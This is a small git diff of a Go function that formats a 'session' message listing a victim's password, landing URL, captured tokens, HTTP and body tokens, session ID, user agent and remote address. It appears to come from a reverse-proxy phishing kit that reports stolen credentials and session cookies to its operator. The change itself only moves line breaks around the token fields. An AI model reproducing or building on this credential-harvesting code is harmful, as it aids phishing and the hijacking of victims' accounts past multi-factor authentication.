@@ -16,11 +16,11 @@ func formatSessionMessage(session Session) string {
 		"🔑 Password:      ➖ %s\n"+
 		"🌐 Landing URL:   ➖ %s\n"+
 
-		"🆔 Tokens:        ➖ ``` \n [ %s ] \n ``` \n "+
-		"🆔 HTTPTokens:    ➖ ``` \n [ %s ] \n ``` \n "+
-		"🆔 BodyTokens:    ➖ ``` \n [ %s ] \n ``` \n "+
-		"🆔 Custom:        ➖ ``` \n [ %s ] \n ``` \n "+
-		"🆔 Session ID:    ➖ ``` \n [ %s ] \n ``` \n "+
+		"🆔 Tokens:        ➖ \n ``` \n [ %s ] \n ``` \n "+
+		"🆔 HTTPTokens:    ➖ \n ``` \n [ %s ] \n ``` \n "+
+		"🆔 BodyTokens:    ➖ \n ``` \n [ %s ] \n ``` \n "+
+		"🆔 Custom:        ➖ \n ``` \n [ %s ] \n ``` \n "+
+		"🆔 Session ID:    ➖ \n ``` \n [ %s ] \n ``` \n "+
 
 		"🖥️ User Agent:    ➖ %s\n"+
 		"🌍 Remote Address:➖ %s\n"+
